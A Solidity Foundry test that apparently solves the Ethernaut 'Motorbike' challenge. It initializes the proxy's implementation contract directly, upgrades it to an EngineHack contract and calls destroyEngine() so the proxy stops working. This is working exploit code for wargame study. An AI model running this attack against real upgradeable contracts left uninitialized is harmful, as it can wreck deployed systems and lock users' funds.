// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.1;

import "forge-std/Test.sol";
import { Motorbike, Engine, EngineHack } from "../src/Motorbike.sol";

contract MotorbikeTest is Test {
    Engine public engine;
    EngineHack public engineHack;
    Motorbike public motorbike;

    function setUp() public {
        engine = new Engine();
        engineHack = new EngineHack();
        motorbike = new Motorbike(address(engine));
    }

    function testMotorbike() public {
        engine.initialize(); // will initialize tx.origin as upgrader, since we call implementation directly

        engine.upgradeToAndCall(address(engineHack), abi.encodeWithSignature("destroyEngine()"));

        vm.expectRevert();
        address(motorbike).call(abi.encodeWithSignature("upgrader()"));
    }
}
